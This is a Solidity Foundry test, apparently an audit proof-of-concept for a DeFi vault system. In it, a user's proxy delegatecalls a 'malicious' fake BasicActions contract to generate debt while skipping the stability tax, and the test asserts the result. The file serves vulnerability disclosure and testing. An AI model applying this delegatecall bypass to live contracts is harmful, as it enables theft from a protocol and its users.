// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

import 'forge-std/Test.sol';
import {AnvilFork} from '@test/nft/anvil/AnvilFork.t.sol';
import {WSTETH, ARB, CBETH, RETH, MAGIC} from '@script/GoerliParams.s.sol';
import {IERC20} from '@openzeppelin/token/ERC20/IERC20.sol';
import {SafeERC20} from '@openzeppelin/token/ERC20/utils/SafeERC20.sol';
import {Vault721} from '@contracts/proxies/Vault721.sol';
import {IODSafeManager} from '@interfaces/proxies/IODSafeManager.sol';
import {ISAFEEngine} from '@interfaces/ISAFEEngine.sol';
import {ODSafeManager} from '@contracts/proxies/ODSafeManager.sol';
import {ODProxy} from '@contracts/proxies/ODProxy.sol';
import {FakeBasicActions} from '@test/nft/anvil/FakeBasicActions.sol';

contract NinjaTests is AnvilFork {
  using SafeERC20 for IERC20;

  FakeBasicActions fakeBasicActions;

  function test_setup() public {
    assertEq(totalVaults, vault721.totalSupply());
    checkProxyAddress();
    checkVaultIds();
  }

  function test_GenerateDebtWithoutTax() public {
    fakeBasicActions = new FakeBasicActions();
    address proxy = proxies[1];
    bytes32 cType = cTypes[1];
    uint256 vaultId = vaultIds[proxy][cType];

    bytes memory payload = abi.encodeWithSelector(
      fakeBasicActions.lockTokenCollateralAndGenerateDebt.selector,
      address(safeManager),
      address(taxCollector),
      address(collateralJoin[cType]),
      address(coinJoin),
      vaultId,
      1,
      0
    );
    vm.startPrank(users[1]);

    // Proxy makes a delegatecall to Malicious BasicAction contract and bypasses the TAX payment
    ODProxy(proxy).execute(address(fakeBasicActions), payload);
    genDebt(vaultId, 10, proxy);

    vm.stopPrank();

    IODSafeManager.SAFEData memory sData = safeManager.safeData(vaultId);
    address safeHandler = sData.safeHandler;
    ISAFEEngine.SAFE memory SafeEngineData = safeEngine.safes(cType, safeHandler);
    assertEq(1, SafeEngineData.lockedCollateral);
    assertEq(10, SafeEngineData.generatedDebt);
  }
}
